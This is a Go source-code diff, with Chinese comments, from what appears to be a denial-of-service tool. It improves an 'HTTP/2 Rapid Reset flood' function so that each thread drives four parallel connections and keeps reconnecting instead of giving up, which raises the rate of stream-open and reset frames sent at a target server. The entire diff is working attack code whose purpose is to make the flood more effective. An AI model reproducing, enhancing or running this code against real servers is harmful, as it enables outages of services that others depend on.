@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"crypto/tls"
 	"fmt"
-	"log"
 	"net"
 	"net/url"
 	"strings"
@@ -111,8 +110,12 @@ func dialH2(addr string, useTLS bool, timeout time.Duration) (net.Conn, *http2.F
 	return conn, framer, nil
 }
 
+// resetConnsPerThread 每线程连接槽数：单连接受 TCP 窗口限制（RTT 高时
+// 帧率被 ACK 节奏锁死），多槽并行写 + 槽间互相隐藏拨号 RTT。
+const resetConnsPerThread = 4
+
 // StartHTTP2ResetEx HTTP/2 Rapid Reset 洪水。
-// threads = 并发连接数（每连接一个 goroutine 循环建流/重置）；
+// threads = 并发线程；每线程 resetConnsPerThread 条连接并行建流/重置。
 // PacketSize 控制随机路径长度（默认 16，范围 1-512）。
 func StartHTTP2ResetEx(cfg AttackConfig) *AttackSession {
 	s := NewAttackSession(cfg.Target, cfg.Targets, "http2_reset", newRateLimiter(cfg.RateLimitPPS, cfg.RateLimitBPS))
@@ -161,60 +164,74 @@ func StartHTTP2ResetEx(cfg AttackConfig) *AttackSession {
 				defer wg.Done()
 				rng := NewFastRNG(time.Now().UnixNano() + seed)
 				endTime := time.Now().Add(dur)
-				tc := newTimeCache()
 
 				path := "/" + randomAlpha(rng, pathLen-1)
 				if pathLen < 2 {
 					path = "/"
 				}
 
-				conn, framer, err := dialH2(addr, useTLS, 5*time.Second)
-				if err != nil {
-					log.Printf("[http2_reset] dial %s failed: %v", addr, err)
-					atomic.AddUint64(&s.Stats.Errors, 1)
-					return
-				}
-				rc := &h2ResetConn{conn: conn, framer: framer, streamID: 1}
-				rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
+				var slotWG sync.WaitGroup
+				for slot := 0; slot < resetConnsPerThread; slot++ {
+					slotWG.Add(1)
+					go func() {
+						defer slotWG.Done()
+						tc := newTimeCache()
+						var conn net.Conn
+						var rc *h2ResetConn
 
-				closeConn := func() {
-					conn.Close()
-					conn = nil
-					rc = nil
-				}
-
-				for tc.since(endTime) < 0 {
-					select {
-					case <-s.StopChan:
-						return
-					default:
-					}
-
-					if !s.checkRate(63) { // HEADERS(~50B) + RST(13B)
-						time.Sleep(time.Microsecond * 100)
-						continue
-					}
-
-					if err := rc.writeResetStream(scheme, authority, path); err != nil {
-						// 连接损坏：重连（流 ID 随连接重置）
-						closeConn()
-						conn, framer, err = dialH2(addr, useTLS, 5*time.Second)
-						if err != nil {
-							atomic.AddUint64(&s.Stats.Errors, 1)
-							return
+						// 拨号/重连：失败退避重试，绝不退出（一条连接挂掉
+						// 不影响本线程继续打）
+						ensureConn := func() bool {
+							if rc != nil {
+								return true
+							}
+							c, framer, err := dialH2(addr, useTLS, 5*time.Second)
+							if err != nil {
+								atomic.AddUint64(&s.Stats.Errors, 1)
+								time.Sleep(100 * time.Millisecond)
+								return false
+							}
+							conn = c
+							rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
+							rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
+							return true
 						}
-						rc = &h2ResetConn{conn: conn, framer: framer, streamID: 1}
-						rc.hpackEnc = hpack.NewEncoder(&rc.hpackBuf)
-						atomic.AddUint64(&s.Stats.Errors, 1)
-						continue
-					}
-					atomic.AddUint64(&s.Stats.PacketsSent, 1)
-					atomic.AddUint64(&s.Stats.BytesSent, 63)
-					tc.refresh()
+
+						for tc.since(endTime) < 0 {
+							select {
+							case <-s.StopChan:
+								if conn != nil {
+									conn.Close()
+								}
+								return
+							default:
+							}
+
+							if !ensureConn() {
+								continue
+							}
+							if !s.checkRate(63) { // HEADERS(~50B) + RST(13B)
+								time.Sleep(time.Microsecond * 100)
+								continue
+							}
+
+							if err := rc.writeResetStream(scheme, authority, path); err != nil {
+								// 连接损坏：关闭，下一轮重连（流 ID 随连接重置）
+								conn.Close()
+								conn, rc = nil, nil
+								atomic.AddUint64(&s.Stats.Errors, 1)
+								continue
+							}
+							atomic.AddUint64(&s.Stats.PacketsSent, 1)
+							atomic.AddUint64(&s.Stats.BytesSent, 63)
+							tc.refresh()
+						}
+						if conn != nil {
+							conn.Close()
+						}
+					}()
 				}
-				if conn != nil {
-					conn.Close()
-				}
+				slotWG.Wait()
 			}(int64(i))
 		}
 
